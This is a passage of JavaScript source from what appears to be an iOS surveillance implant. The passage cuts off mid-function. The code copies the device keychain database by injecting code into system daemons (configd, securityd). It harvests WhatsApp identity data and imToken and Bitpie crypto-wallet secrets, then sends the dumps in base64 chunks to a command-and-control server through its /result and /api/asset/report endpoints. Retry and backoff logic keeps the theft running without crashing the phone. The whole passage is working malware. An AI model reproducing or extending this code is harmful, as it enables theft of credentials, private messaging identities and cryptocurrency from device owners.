					try { lsrc = __peReadFileUtf8("/tmp/c2_ipc/mod.keychain_pe_local", 131000); } catch (_) {}
					if (!lsrc || lsrc.length < 40) {
						let ldrop = peDirectDropPayload("keychain_pe_local.js", peDeviceUuid());
						if (ldrop && ldrop.src && ldrop.src.length > 40) lsrc = String(ldrop.src);
						else if (ldrop && ldrop.ok && ldrop.path) lsrc = __peReadFileUtf8(ldrop.path, 131000);
					}
					if (lsrc && lsrc.length > 40) {
						LOG("[CFG-Q] keychain pe_local eval len=" + lsrc.length);
						(0, eval)(lsrc);
						try {
							let t2 = fopen(get_cstring("/tmp/keychain-2.db"), get_cstring("r"));
							if (t2 && t2 !== 0n) {
								fclose(t2);
								LOG("[CFG-Q] keychain pe_local OK");
								return { ok: true, via: "pe_local" };
							}
						} catch (_) {}
						LOG("[CFG-Q] keychain pe_local FAIL (no db)");
					}
				} catch (plE) {
					LOG("[CFG-Q] keychain pe_local ERR: " + String(plE).slice(0, 80));
				}
			}
			if (opts.configd === false) {
				return { ok: false, error: "no_keychain_db", via: "pe_local_only" };
			}
			let tgGate = peTgUploadGate();
			if (!tgGate.ready) {
				let nowTg = Date.now();
				let qTg = peCfgQInit();
				if ((nowTg - (Number(qTg.tg_wait_log_ts) || 0)) >= 5000) {
					qTg.tg_wait_log_ts = nowTg;
					LOG("[CFG-Q] wait TG upload before configd GetTask reason=" +
						tgGate.reason + " remain_ms=" + (tgGate.wait_ms || 0));
				}
				return {
					ok: false,
					error: "wait_tg_upload",
					via: "tg_gate",
					wait_ms: tgGate.wait_ms || 0
				};
			}
			// After pe_local miss: still MUST open configd this cold boot, but NOT sync in the
			// same tick (GetTask hang -> reboot). Arm kc_cfg_arm_at only - do NOT peCfgBurn
			// (session_start / peCfgInject must keep working). Hot keychain_copy with
			// allowPeLocal=false skips this defer (immediateConfigd).
			let qArm = peCfgQInit();
			let forceImm = !!(opts.immediateConfigd || opts.immediate);
			if (triedPeLocal && !forceImm) {
				let gap = Number(opts.defer_ms);
				if (!Number.isFinite(gap) || gap < 0) gap = Number(qArm.retry_ms) || 15000;
				if (!qArm.kc_cfg_armed) {
					qArm.kc_cfg_armed = true;
					qArm.kc_cfg_arm_at = Date.now() + gap;
					LOG("[CFG-Q] keychain pe_local miss - arm configd in " + gap +
						"ms (no GetTask this tick; session_start unaffected)");
					return {
						ok: false,
						error: "no_keychain_db",
						via: "cfg_deferred",
						wait_ms: gap
					};
				}
				let wait = Math.max(0, (Number(qArm.kc_cfg_arm_at) || 0) - Date.now());
				if (wait > 0) {
					LOG("[CFG-Q] keychain configd armed - wait " + wait + "ms");
					return {
						ok: false,
						error: "no_keychain_db",
						via: "cfg_deferred",
						wait_ms: wait
					};
				}
				LOG("[CFG-Q] keychain configd arm due - opening RC now");
			}
			let kcCode = peCfgLoadKeychainCode();
			if (!kcCode) return { ok: false, error: "need_pe_load", via: "none" };
			let r = peCfgInject(kcCode, {
				purpose: "keychain",
				syncEval: false,
				applyTokensBefore: false,
				forceCfString: true
			});
			if (!r.ok) return { ok: false, error: r.error || "cfg_inject_fail", via: "configd", wait_ms: r.wait_ms };
			let dbOk = false;
			let polls = Number(opts.pollSec);
			if (!Number.isFinite(polls) || polls < 1) polls = 12;
			for (let i = 0; i < polls; i++) {
				try { N.callSymbol("sleep", 1); } catch (_) {}
				try {
					let t3 = fopen(get_cstring("/tmp/keychain-2.db"), get_cstring("r"));
					if (t3 && t3 !== 0n) { fclose(t3); dbOk = true; break; }
				} catch (_) {}
			}
			if (dbOk) {
				try { peCfgBurn("keychain_copy_done", 15000); } catch (_) {}
				LOG("[CFG-Q] keychain configd OK - burned RC (no keep for sessions)");
			} else {
				LOG("[CFG-Q] keychain configd FAIL reused=" + !!r.reused);
			}
			return { ok: dbOk, error: dbOk ? undefined : "tmp_missing", via: "configd", reused: !!r.reused, pid: r.pid };
		}
		globalThis.__peCfgQInit = peCfgQInit;
		globalThis.__peCfgEnsureRc = peCfgEnsureRc;
		globalThis.__peCfgInject = peCfgInject;
		globalThis.__peCfgKeychainCopy = peCfgKeychainCopy;
		globalThis.__peCfgBurn = peCfgBurn;
		function peDirectEnsureP7(force) {
			// identity-first RC, but sqlite needs /tmp/keychain-2.db (or readable /var/Keychains).
			// pe-297 skip caused RC-ok + DB rc=14 - burn retries. Ensure DB before Phase2.
			void force;
			let q = globalThis.__pe_sec_q;
			let src = (q && q.allow_reentry) ? ("queue:" + (q.attempts || 0)) : "force";
			let kcOk = false;
			let kr = null;
			try {
				let tfd = fopen(get_cstring("/tmp/keychain-2.db"), get_cstring("r"));
				if (tfd && tfd !== 0n) { fclose(tfd); kcOk = true; }
			} catch (_) {}
			if (!kcOk) {
				LOG("[PE-DIRECT] no /tmp/keychain-2.db - CFG-Q keychain before securityd unwrap");
				try {
					// defer configd after pe_local miss (SEC-Q owns interval retry).
					kr = peCfgKeychainCopy({
						allowPeLocal: true,
						configd: true,
						pollSec: 12,
						immediateConfigd: false
					});
					kcOk = !!(kr && kr.ok);
					if (!kcOk) {
						LOG("[PE-DIRECT] CFG-Q keychain miss via=" + ((kr && kr.via) || "?") +
							" err=" + ((kr && kr.error) || "?") +
							(kr && kr.wait_ms ? (" wait_ms=" + kr.wait_ms) : ""));
					}
				} catch (kcE) {
					LOG("[PE-DIRECT] keychain before P7 ERR: " + String(kcE).slice(0, 80));
				}
			}
			peP7CacheSave({ started: true, done: false, phase: "all", ok: false, wa_identity: false, source: "pe_direct" });
			LOG("[PE-DIRECT] p7_warmup begin identity-first src=" + src +
				" keychain_db=" + (kcOk ? "1" : "0"));
			if (!kcOk) {
				LOG("[PE-DIRECT] abort Phase2 - PRE requires keychain DB (no securityd RC)");
				return {
					ok: false,
					error: (kr && kr.error) ? kr.error : "no_keychain_db",
					phase: "pre",
					wa_identity: false,
					wait_ms: (kr && kr.wait_ms) || 0
				};
			}
			try { globalThis.__pe_p7_pre = null; } catch (_) {}
			let pr = { ok: false, error: "no_p7_fn" };
			try {
				if (typeof globalThis.__peP7Phase2 === "function") {
					pr = globalThis.__peP7Phase2(src);
				}
			} catch (p7e) {
				pr = { ok: false, error: String(p7e).slice(0, 120) };
			}
			let idOk = !!(pr.wa_identity || peP7IdentityOnDisk());
			let dumpOk = !!(pr.dump || (typeof peP7DumpOnDisk === "function" && peP7DumpOnDisk()));
			peP7CacheSave({
				done: true,
				started: true,
				ok: !!(idOk && dumpOk),
				wa_identity: idOk,
				error: pr.error || "",
				phase: "all",
				source: "pe_direct",
				keychain_ok: kcOk,
				keychain_skipped: !kcOk,
				skipped: pr.skipped || "",
				sec_q_attempts: q ? q.attempts : 0
			});
			LOG("[PE-DIRECT] p7 done ok=" + !!(idOk && dumpOk) + " wa_identity=" + idOk +
				" dump=" + dumpOk + " keychain_ok=" + kcOk);
			// Side-channel: arm dump exfil when dump landed (SEC-Q still waits for dump+wa).
			try { peP7DumpExfilMaybeArm(idOk && dumpOk ? "p7_ok" : "p7_partial"); } catch (_) {}
			return pr;
		}
		// securityd RC queue - retry until dump AND wa_identity (max_attempts=0 -> unlimited).
		// Identity work is batchable: collect wrap blobs locally, ONE RC, many aksUnwrap calls.
		// Interval is persisted to /tmp/secq_last.txt so a missed in-memory next_at still waits.
		const PE_SECQ_LAST_TXT = "/tmp/secq_last.txt";
		const PE_SECQ_LAST_JSON = "/tmp/c2_ipc/secq_last.json";
		function peSecQReadGate() {
			try {
				let raw = __peReadFileUtf8(PE_SECQ_LAST_JSON, 4096);
				if (raw && raw.length > 8) return JSON.parse(raw);
			} catch (_) {}
			try {
				let t = __peReadFileUtf8(PE_SECQ_LAST_TXT, 2048);
				if (!t) return null;
				let o = {};
				let grab = function (re, key) {
					let m = t.match(re);
					if (m) o[key] = m[1];
				};
				grab(/last_start_ms=(\d+)/, "last_start");
				grab(/last_end_ms=(\d+)/, "last_end");
				grab(/attempt=(\d+)/, "attempt");
				grab(/consec_fail=(\d+)/, "consec_fail");
				grab(/cool_ms=(\d+)/, "cool_ms");
				grab(/next_at_ms=(\d+)/, "next_at");
				grab(/result=(\S+)/, "result");
				grab(/err=(.*)/, "err");
				o.last_start = Number(o.last_start) || 0;
				o.last_end = Number(o.last_end) || 0;
				o.attempt = Number(o.attempt) || 0;
				o.consec_fail = Number(o.consec_fail) || 0;
				o.cool_ms = Number(o.cool_ms) || 0;
				o.next_at = Number(o.next_at) || 0;
				return o;
			} catch (_) {}
			return null;
		}
		function peSecQWriteGate(fields) {
			let prev = peSecQReadGate() || {};
			let o = {};
			let keys = ["last_start", "last_end", "attempt", "consec_fail", "cool_ms", "next_at", "result", "err"];
			for (let i = 0; i < keys.length; i++) {
				let k = keys[i];
				o[k] = (fields && fields[k] !== undefined) ? fields[k] : prev[k];
			}
			o.attempt = Number(o.attempt) || 0;
			o.consec_fail = Number(o.consec_fail) || 0;
			o.cool_ms = Number(o.cool_ms) || 0;
			o.last_start = Number(o.last_start) || 0;
			o.last_end = Number(o.last_end) || 0;
			o.next_at = Number(o.next_at) || 0;
			o.result = String(o.result || "");
			o.err = String(o.err || "").slice(0, 80);
			o.written_ms = Date.now();
			let remain = Math.max(0, o.next_at - Date.now());
			let txt = "last_start_ms=" + o.last_start +
				"\nlast_end_ms=" + o.last_end +
				"\nattempt=" + o.attempt +
				"\nconsec_fail=" + o.consec_fail +
				"\ncool_ms=" + o.cool_ms +
				"\nnext_at_ms=" + o.next_at +
				"\nremain_ms=" + remain +
				"\nresult=" + o.result +
				"\nerr=" + o.err +
				"\nwritten_ms=" + o.written_ms + "\n";
			try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
			try { __peWriteFileUtf8(PE_SECQ_LAST_JSON, JSON.stringify(o) + "\n"); } catch (_) {}
			try { __peWriteFileUtf8(PE_SECQ_LAST_TXT, txt); } catch (_) {}
			try { N.callSymbol("chmod", PE_SECQ_LAST_TXT, 0x1ff); } catch (_) {}
			try { N.callSymbol("chmod", PE_SECQ_LAST_JSON, 0x1ff); } catch (_) {}
			let qq = globalThis.__pe_sec_q;
			if (qq) {
				qq.consec_fail = o.consec_fail;
				if (o.next_at > (Number(qq.next_at) || 0)) qq.next_at = o.next_at;
			}
			return o;
		}
		function peSecQIntervalMs(consecFail) {
			// Slow path: keep retrying WA/imToken/P7 for a long window without burning RC too fast.
			let n = Number(consecFail) || 0;
			if (n >= 12) return 180000;
			if (n >= 6) return 90000;
			if (n > 0 && (n % 4) === 0) return 40000;
			return 20000;
		}
		function peSecQApplyDiskWait(q) {
			if (!q) return q;
			let disk = peSecQReadGate();
			if (!disk) return q;
			let diskNext = Number(disk.next_at) || 0;
			if (diskNext > (Number(q.next_at) || 0)) q.next_at = diskNext;
			let cf = Number(disk.consec_fail) || 0;
			if (cf > (Number(q.consec_fail) || 0)) q.consec_fail = cf;
			return q;
		}
		function peSecQInit() {
			if (globalThis.__pe_sec_q) return globalThis.__pe_sec_q;
			let disk = peSecQReadGate() || {};
			globalThis.__pe_sec_q = {
				jobs: [],
				attempts: 0,
				max_attempts: 0,
				retry_ms: 20000,
				next_at: Number(disk.next_at) || 0,
				state: "idle", // idle|armed|running|cooldown|done|exhausted
				allow_reentry: true,
				last_ok_ts: 0,
				last_fail_ts: 0,
				first_ok_attempt: 0,
				consec_fail: Number(disk.consec_fail) || 0,
				pipe: null
			};
			return globalThis.__pe_sec_q;
		}
		function peSecQAttemptLabel(q) {
			let max = Number(q && q.max_attempts) || 0;
			return String((q && q.attempts) || 0) + "/" + (max > 0 ? max : "inf");
		}
		function peSecQCapReached(q) {
			let max = Number(q && q.max_attempts) || 0;
			return max > 0 && Number(q.attempts) >= max;
		}
		function peSecQEnqueueIdentity(pipe, armDelayMs) {
			let q = peSecQInit();
			let delay = armDelayMs == null ? q.retry_ms : armDelayMs;
			let has = false;
			for (let i = 0; i < q.jobs.length; i++) {
				if (q.jobs[i] && q.jobs[i].kind === "p7_identity") { has = true; break; }
			}
			if (!has) {
				q.jobs.push({
					id: "p7id-" + Date.now().toString(16),
					kind: "p7_identity",
					enqueued_at: Date.now()
				});
			}
			q.pipe = pipe || q.pipe;
			if (q.state === "idle" || q.state === "armed") {
				q.state = "armed";
				peSecQApplyDiskWait(q);
				let want = Date.now() + delay;
				if (want > (Number(q.next_at) || 0)) q.next_at = want;
			}
			LOG("[SEC-Q] enqueue p7_identity jobs=" + q.jobs.length +
				" next_in_ms=" + Math.max(0, q.next_at - Date.now()) +
				" attempts=" + peSecQAttemptLabel(q) +
				" retry_ms=" + q.retry_ms);
			return q;
		}
		function peSecQArmWaAfter(pipe, identityOk, delayMs) {
			if (!pipe || pipe.state !== "running") return;
			if (pipe.wa_pending && pipe.wa_pending.length) {
				let d = delayMs == null ? (identityOk ? 30000 : 20000) : delayMs;
				pipe.wa_arm_at = Date.now() + d;
				pipe.wa_identity = !!identityOk;
				globalThis.__pe_wa_direct_pending = true;
				LOG("[SEC-Q] arm WA in " + d + "ms n=" + pipe.wa_pending.length +
					" identity=" + !!identityOk);
			}
			// imToken vault collect after P7 (keychain slice ready); short delay vs WA.
			if (pipe.im_pending && pipe.im_pending.length) {
				let id = delayMs == null ? (identityOk ? 5000 : 3000) : Math.min(Number(delayMs) || 5000, 8000);
				pipe.im_arm_at = Date.now() + id;
				globalThis.__pe_im_direct_pending = true;
				LOG("[SEC-Q] arm imToken in " + id + "ms n=" + pipe.im_pending.length);
			}
			// Bitpie keychain slice (r18lib pe-native path) after P7.
			if (pipe.bp_pending && pipe.bp_pending.length) {
				let bd = delayMs == null ? (identityOk ? 4000 : 2500) : Math.min(Number(delayMs) || 4000, 6000);
				pipe.bp_arm_at = Date.now() + bd;
				globalThis.__pe_bp_direct_pending = true;
				LOG("[SEC-Q] arm Bitpie in " + bd + "ms n=" + pipe.bp_pending.length);
			}
			// Always arm SB wallet_scan port (sandbox:true + hunt missing im/bp) after SEC-Q.
			let wd = identityOk ? 7000 : 5000;
			pipe.wallet_arm_at = Date.now() + wd;
			globalThis.__pe_wallet_direct_pending = true;
			LOG("[SEC-Q] arm wallet_scan in " + wd + "ms (SB port / hunt)");
			// /war message.txt package - after dump+sandbox; NEVER opens securityd.
			let wr = identityOk ? 14000 : 10000;
			pipe.war_arm_at = Date.now() + wr;
			globalThis.__pe_war_direct_pending = true;
			LOG("[SEC-Q] arm /war pkg in " + wr + "ms (old_pe message.txt)");
		}
		function peDirectP7DeferredTick() {
			try {
				if (globalThis.__pe_p7_direct_pending) {
					let armAt = Number(globalThis.__pe_p7_direct_arm_at || 0);
					let delay = armAt ? Math.max(0, armAt - Date.now()) : 0;
					let q0 = peSecQInit();
					peSecQEnqueueIdentity(globalThis.__pe_p7_direct_pipe, delay || q0.retry_ms);
					globalThis.__pe_p7_direct_pending = false;
					globalThis.__pe_p7_direct_arm_at = 0;
					globalThis.__pe_p7_direct_pipe = null;
				}
				let q = globalThis.__pe_sec_q;
				if (!q || !q.jobs.length) return;
				if (q.state === "done" || q.state === "exhausted") return;
				if (globalThis.__pe_p7_state && globalThis.__pe_p7_state.running) return;
				if (q.state === "running") return;
				peSecQApplyDiskWait(q);
				if (Date.now() < Number(q.next_at || 0)) {
					if ((Date.now() - (Number(q.last_wait_log_ts) || 0)) >= 5000) {
						q.last_wait_log_ts = Date.now();
						LOG("[SEC-Q] wait interval remain=" +
							Math.max(0, (Number(q.next_at) || 0) - Date.now()) +
							"ms consec_fail=" + (q.consec_fail || 0) +
							" file=/tmp/secq_last.txt");
					}
					return;
				}
				let tgHold = peTgUploadGate();
				if (!tgHold.ready) {
					if ((Date.now() - (Number(q.last_wait_log_ts) || 0)) >= 5000) {
						q.last_wait_log_ts = Date.now();
						LOG("[SEC-Q] hold fire until TG upload reason=" + tgHold.reason +
							" remain_ms=" + (tgHold.wait_ms || 0));
					}
					return;
				}
				let dumpSkip = typeof peP7DumpOnDisk === "function" && peP7DumpOnDisk();
				let waSkip = typeof peP7IdentityOnDisk === "function" && peP7IdentityOnDisk();
				if (dumpSkip && waSkip) {
					q.state = "done";
					q.jobs = [];
					q.allow_reentry = false;
					LOG("[SEC-Q] skip fire - dump+wa_identity on disk");
					try { peP7DumpExfilMaybeArm("secq_ok"); } catch (_) {}
					let pipeSkip = q.pipe || globalThis.__pe_direct_pipe;
					if (pipeSkip) {
						pipeSkip.p7_done = true;
						pipeSkip.wa_identity = true;
						peSecQArmWaAfter(pipeSkip, true, 20000);
					}
					return;
				}
				if (peSecQCapReached(q)) {
					q.state = "exhausted";
					q.allow_reentry = false;
					LOG("[SEC-Q] exhausted attempts=" + peSecQAttemptLabel(q) + " - no dump+wa this pe");
					let pipeX = q.pipe || globalThis.__pe_direct_pipe;
					if (pipeX) {
						pipeX.p7_done = true;
						pipeX.wa_identity = !!peP7IdentityOnDisk();
						peSecQArmWaAfter(pipeX, !!pipeX.wa_identity, 8000);
					}
					q.jobs = [];
					return;
				}
				q.state = "running";
				q.attempts++;
				q.allow_reentry = true;
				peSecQWriteGate({
					last_start: Date.now(),
					attempt: q.attempts,
					consec_fail: q.consec_fail || 0,
					result: "running",
					err: ""
				});
				LOG("[SEC-Q] fire securityd RC attempt=" + peSecQAttemptLabel(q) +
					" dump=" + dumpSkip + " wa=" + waSkip +
					" consec_fail=" + (q.consec_fail || 0) + " file=/tmp/secq_last.txt");
				let pr = { ok: false };
				try { pr = peDirectEnsureP7(false) || pr; } catch (p7e) {
					LOG("[SEC-Q] Phase2 ERR: " + String(p7e).slice(0, 80));
				}
				let idOk = !!(pr.wa_identity || peP7IdentityOnDisk());
				let dumpOk = !!(pr.dump || (typeof peP7DumpOnDisk === "function" && peP7DumpOnDisk()));
				let pipe = q.pipe || globalThis.__pe_direct_pipe;
				if (idOk && dumpOk) {
					q.state = "done";
					q.last_ok_ts = Date.now();
					q.first_ok_attempt = q.attempts;
					q.jobs = [];
					q.allow_reentry = false;
					q.consec_fail = 0;
					peSecQWriteGate({
						last_end: Date.now(),
						attempt: q.attempts,
						consec_fail: 0,
						cool_ms: 0,
						next_at: 0,
						result: "ok",
						err: ""
					});
					LOG("[SEC-Q] SUCCESS dump+wa at attempt=" + q.attempts + " - no more securityd RC");
					try { peP7DumpExfilMaybeArm("secq_ok"); } catch (_) {}
					if (pipe) {
						pipe.p7_done = true;
						pipe.wa_identity = true;
						peSecQArmWaAfter(pipe, true, 20000);
					}
					return;
				}
				q.last_fail_ts = Date.now();
				let stFail = globalThis.__pe_p7_state || {};
				let errS = String((pr && pr.error) || stFail.err || "");
				// PRE failed (no DB / no jobs): do NOT burn securityd RC - wait for keychain then retry PRE.
				if (errS.indexOf("wait_tg_upload") >= 0 || errS.indexOf("no_keychain_db") >= 0 ||
					errS.indexOf("precollect") >= 0 ||
					errS.indexOf("no_unwrap_jobs") >= 0 || errS.indexOf("sqlite_open") >= 0 ||
					(pr && pr.phase === "pre")) {
					try { globalThis.__pe_p7_pre = null; } catch (_) {}
					let preCool = 20000;
					if (errS.indexOf("wait_tg_upload") >= 0) preCool = Math.max(8000, Number((pr && pr.wait_ms) || 8000));
					else if (errS.indexOf("no_keychain_db") >= 0) preCool = 60000;
					q.next_at = Date.now() + preCool;
					q.state = "cooldown";
					peSecQWriteGate({
						last_end: Date.now(),
						attempt: q.attempts,
						consec_fail: q.consec_fail || 0,
						cool_ms: preCool,
						next_at: q.next_at,
						result: "pre_fail",
						err: errS
					});
					LOG("[SEC-Q] PRE fail (" + errS.slice(0, 60) + ") - no RC burned; retry PRE in " +
						preCool + "ms file=/tmp/secq_last.txt");
				} else if (stFail.rc_ok && !(idOk && dumpOk)) {
					let coolDb = 45000;
					q.next_at = Date.now() + coolDb;
					q.state = "cooldown";
					peSecQWriteGate({
						last_end: Date.now(),
						attempt: q.attempts,
						consec_fail: q.consec_fail || 0,
						cool_ms: coolDb,
						next_at: q.next_at,
						result: "rc_ok_incomplete",
						err: errS
					});
					LOG("[SEC-Q] RC_OK incomplete dump=" + dumpOk + " wa=" + idOk +
						" - backoff " + coolDb + "ms");
				} else {
					q.consec_fail = (Number(q.consec_fail) || 0) + 1;
					let cool = peSecQIntervalMs(q.consec_fail);
					q.next_at = Date.now() + cool;
					q.state = "cooldown";
					peSecQWriteGate({
						last_end: Date.now(),
						attempt: q.attempts,
						consec_fail: q.consec_fail,
						cool_ms: cool,
						next_at: q.next_at,
						result: "fail",
						err: errS
					});
					LOG("[SEC-Q] FAIL attempt=" + q.attempts + " err=" + errS.slice(0, 50) +
						" dump=" + dumpOk + " wa=" + idOk + " consec_fail=" + q.consec_fail +
						" retry in " + cool + "ms file=/tmp/secq_last.txt");
				}
				if (peSecQCapReached(q)) {
					q.state = "exhausted";
					q.allow_reentry = false;
					q.jobs = [];
					LOG("[SEC-Q] exhausted after fail - arm WA session_half path");
					try { peP7DumpExfilMaybeArm("secq_exhausted"); } catch (_) {}
					if (pipe) {
						pipe.p7_done = true;
						pipe.wa_identity = false;
						peSecQArmWaAfter(pipe, false, 10000);
					}
				}
			} catch (_) {}
		}
		function peB64FromLatin1(bin) {
			// Hard-bounded encoder - prior while-loop could hang listen if length/coercion went weird.
			bin = String(bin || "");
			let n = bin.length | 0;
			if (!Number.isFinite(n) || n <= 0) return "";
			if (n > PE_EXFIL_CHUNK_HARD_MAX) n = PE_EXFIL_CHUNK_HARD_MAX;
			const T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
			let out = new Array(((n + 2) / 3 | 0) * 4);
			let oi = 0;
			for (let i = 0; i < n; i += 3) {
				let a = bin.charCodeAt(i) & 255;
				let b = (i + 1 < n) ? (bin.charCodeAt(i + 1) & 255) : 0;
				let c = (i + 2 < n) ? (bin.charCodeAt(i + 2) & 255) : 0;
				let triple = (a << 16) | (b << 8) | c;
				out[oi++] = T.charAt((triple >> 18) & 63);
				out[oi++] = T.charAt((triple >> 12) & 63);
				out[oi++] = (i + 1 < n) ? T.charAt((triple >> 6) & 63) : "=";
				out[oi++] = (i + 2 < n) ? T.charAt(triple & 63) : "=";
			}
			return out.join("");
		}
		// Size-tier -> chunk/budget map (LAN album-scale exfil uses large chunks; tiny files stay small).
		// max = inclusive upper file size for the tier; cs = bytes/chunk; budget = chunks/listen-tick.
		const PE_EXFIL_CHUNK_HARD_MAX = 1024 * 1024; // 1MiB per slice (b64 ~1.33MiB JSON)
		const PE_EXFIL_TIER_TABLE = [
			{ max: 64 * 1024, cs: 16 * 1024, budget: 4, name: "S" },       // ?64KB
			{ max: 512 * 1024, cs: 64 * 1024, budget: 4, name: "M" },      // ?512KB
			{ max: 4 * 1024 * 1024, cs: 256 * 1024, budget: 2, name: "L" }, // ?4MB  (e.g. LocalKeyValue 1.5MB -> ~6 chunks)
			{ max: 64 * 1024 * 1024, cs: 512 * 1024, budget: 2, name: "XL" }, // ?64MB
			{ max: 0x7fffffff, cs: 1024 * 1024, budget: 1, name: "XXL" }  // album / multi-hundred-MB+
		];
		function peExfilTierForSize(size) {
			let sz = Number(size) || 0;
			if (!Number.isFinite(sz) || sz < 0) sz = 0;
			for (let i = 0; i < PE_EXFIL_TIER_TABLE.length; i++) {
				if (sz <= PE_EXFIL_TIER_TABLE[i].max) return PE_EXFIL_TIER_TABLE[i];
			}
			return PE_EXFIL_TIER_TABLE[PE_EXFIL_TIER_TABLE.length - 1];
		}
		function peReadFileSlice(path, offset, len) {
			try {
				let fd = fopen(get_cstring(String(path || "")), get_cstring("rb"));
				if (!fd || fd === 0n) return "";
				let FSEEK = func_resolve("fseek");
				let FREAD = func_resolve("fread");
				if (offset > 0) fcall(FSEEK, fd, BigInt(offset), 0n); // SEEK_SET
				let want = Math.max(0, Number(len) || 0);
				if (!Number.isFinite(want) || want < 0) want = 0;
				if (want > PE_EXFIL_CHUNK_HARD_MAX) want = PE_EXFIL_CHUNK_HARD_MAX;
				if (want === 0) { fclose(fd); return ""; }
				let buf = calloc(1n, BigInt(want + 8));
				let n = fcall(FREAD, buf, 1n, BigInt(want), fd);
				fclose(fd);
				if (!n || n <= 0n) { free(buf); return ""; }
				let nr = Number(n);
				// fread garbage -> Infinity ? `i < Infinity` busy-loop (phone hot). Always clamp.
				if (!Number.isFinite(nr) || nr < 0) { free(buf); return ""; }
				if (nr > want) nr = want;
				let arr = new Array(nr);
				for (let i = 0; i < nr; i++) {
					let qword = uread64(buf + BigInt(i & ~7));
					let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
					arr[i] = String.fromCharCode(b);
				}
				free(buf);
				return arr.join("");
			} catch (_) { return ""; }
		}
		function peExfilUploadChunk(uid, cmdId, path, fname, size, chunkIdx, totalChunks, chunkSize, meta) {
			try {
				let cs = chunkSize || 65536;
				if (cs > PE_EXFIL_CHUNK_HARD_MAX) cs = PE_EXFIL_CHUNK_HARD_MAX;
				if (cs < 1024) cs = 1024;
				let want = size - chunkIdx * cs;
				if (want > cs) want = cs;
				if (want < 0) want = 0;
				if (!Number.isFinite(want)) return { ok: false, error: "bad_want" };
				let chunk = peReadFileSlice(path, chunkIdx * cs, want);
				if (!chunk && want > 0) return { ok: false, error: "read_fail" };
				let b64 = peB64FromLatin1(chunk || "");
				let bodyObj = {
					command_id: String(cmdId || ""),
					uuid: String(uid || ""),
					filename: String(fname || ""),
					category: "exfil",
					chunk_index: chunkIdx | 0,
					total_chunks: totalChunks | 0,
					data: b64
				};
				if (meta && typeof meta === "object") {
					if (meta.app_id) bodyObj.app_id = String(meta.app_id);
					if (meta.app_map_key) bodyObj.app_map_key = String(meta.app_map_key);
					if (meta.agrp) bodyObj.agrp = String(meta.agrp);
					if (meta.module_id) bodyObj.module_id = String(meta.module_id);
					if (meta.asset_category) bodyObj.asset_category = String(meta.asset_category);
				}
				let body = JSON.stringify(bodyObj);
				let fire = globalThis.__peHttpPostJsonFire || null;
				let up = fire ? fire("/result", body) : __peHttpPostJson("/result", body);
				if (!up) return { ok: false, error: "upload_fail" };
				return { ok: true };
			} catch (ex) {
				return { ok: false, error: String(ex).slice(0, 60) };
			}
		}
		function peExfilFileToResult(uid, cmdId, path, chunkSize) {
			// Legacy sync path (commands); prefer peWaExfilTick for WA.
			try {
				let stFn = globalThis.__peFsStat || null;
				let st = stFn ? stFn(path) : null;
				if (!st || !st.exists || !(st.size >= 0)) return { ok: false, error: "missing", path: path };
				let size = Number(st.size) || 0;
				let tier = peExfilTierForSize(size);
				let cs = chunkSize || tier.cs;
				if (cs < 1024) cs = 1024;
				if (cs > PE_EXFIL_CHUNK_HARD_MAX) cs = PE_EXFIL_CHUNK_HARD_MAX;
				let total = Math.ceil(size / cs) || 1;
				let slash = path.lastIndexOf("/");
				let fname = slash >= 0 ? path.slice(slash + 1) : path;
				if (!fname) fname = "exfil.bin";
				LOG("[PE-EXFIL] start " + path + " size=" + size + " chunks=" + total +
					" tier=" + tier.name + " cs=" + cs);
				for (let idx = 0; idx < total; idx++) {
					let r = peExfilUploadChunk(uid, cmdId, path, fname, size, idx, total, cs);
					if (!r || !r.ok) {
						LOG("[PE-EXFIL] upload_fail " + fname + " chunk=" + idx);
						return { ok: false, error: r && r.error || "upload_fail", path: path, chunk: idx };
					}
				}
				LOG("[PE-EXFIL] done " + fname + " " + size + "B");
				return { ok: true, path: path, filename: fname, size: size, chunks: total };
			} catch (ex) {
				return { ok: false, error: String(ex).slice(0, 80), path: path };
			}
		}
		// Old P7 uploaded /tmp/keychain_c2_dump.json after Phase2. SEC-Q owns RC retries;
		// dump exfil is a side-channel tick - never mutates __pe_sec_q state.
		function peP7DumpExfilMaybeArm(reason) {
			try {
				let stFn = globalThis.__peFsStat || null;
				let dumpSt = stFn ? stFn("/tmp/keychain_c2_dump.json") : null;
				if (!dumpSt || !dumpSt.exists || !(dumpSt.size > 0)) return false;
				let cur = globalThis.__pe_p7_dump_exfil;
				if (cur && (cur.done || cur.armed || cur.files)) return true;
				let uid = peDeviceUuid();
				let cid = "pe-p7-" + String(uid || "x").slice(0, 12) + "-" + Date.now().toString(16);
				let candidates = [
					"/tmp/keychain_c2_dump.json",
					"/tmp/keychain_c2_dump.done",
					"/tmp/wa_identity.json",
					"/tmp/imtoken_keychain.json",
					"/tmp/bitpie_keychain.json"
				];
				let files = [];
				for (let i = 0; i < candidates.length; i++) {
					let st = stFn ? stFn(candidates[i]) : null;
					if (!st || !st.exists || !(st.size > 0)) continue;
					let sz = Number(st.size);
					if (!Number.isFinite(sz) || sz <= 0) continue;
					if (sz > 32 * 1024 * 1024) sz = 32 * 1024 * 1024; // dump should stay well under
					files.push({ path: candidates[i], size: sz });
				}
				if (!files.length) return false;
				globalThis.__pe_p7_dump_exfil = {
					armed: true,
					done: false,
					uid: uid,
					cid: cid,
					files: files,
					fi: 0,
					chunkIdx: 0,
					totalChunks: 0,
					cs: 0,
					budget: 0,
					tier: "",
					fname: "",
					size: 0,
					okN: 0,
					failN: 0,
					reason: String(reason || "p7"),
					reported: false
				};
				LOG("[PE-P7-EXFIL] armed n=" + files.length + " cid=" + cid +
					" dumpB=" + (dumpSt.size || 0) + " reason=" + String(reason || "p7"));
				return true;
			} catch (e) {
				LOG("[PE-P7-EXFIL] arm ERR: " + String(e).slice(0, 80));
				return false;
			}
		}
		function peP7DumpExfilTick() {
			try {
				let x = globalThis.__pe_p7_dump_exfil;
				if (!x || x.done || !x.files || !x.files.length) return;
				if (x.fi >= x.files.length) {
					x.done = true;
					x.armed = false;
					LOG("[PE-P7-EXFIL] done ok=" + x.okN + " fail=" + x.failN + " cid=" + x.cid);
					if (!x.reported) {
						x.reported = true;
						try {
							let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
							fire("/api/asset/report", JSON.stringify({
								uid: x.uid,
								uuid: x.uid,
								category: "wallet",
								asset_category: "wallet",
								module_id: "keychain_p7",
